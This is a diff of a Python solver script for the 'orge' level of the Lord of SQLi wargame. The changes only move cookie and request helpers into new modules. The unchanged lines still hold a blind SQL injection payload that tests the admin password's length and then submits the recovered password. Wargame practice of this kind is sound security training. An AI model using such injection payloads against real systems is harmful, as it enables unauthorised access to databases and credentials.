@@ -1,5 +1,7 @@
 #!/usr/bin/env python3
 import los
+import los_cookies
+from connect import my_request as req
 
 
 def check_func(*args) -> bool:
@@ -28,7 +30,7 @@ def main():
     '''
 
     url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
-    cook = los.check_cookies(url)
+    cook = los_cookies.check_cookies(url)
 
     payload = "'||length(pw)>%s&&id=0x61646d696e#"
     param = dict(pw=payload)
@@ -52,7 +54,7 @@ def main():
     print(result)
 
     param = dict(pw=result)
-    response = los.get_request(url, param, cook)
+    response = req.get_request(url, param, cook)
 
     if 'Clear!' in response:
         print('ORGE Clear!')
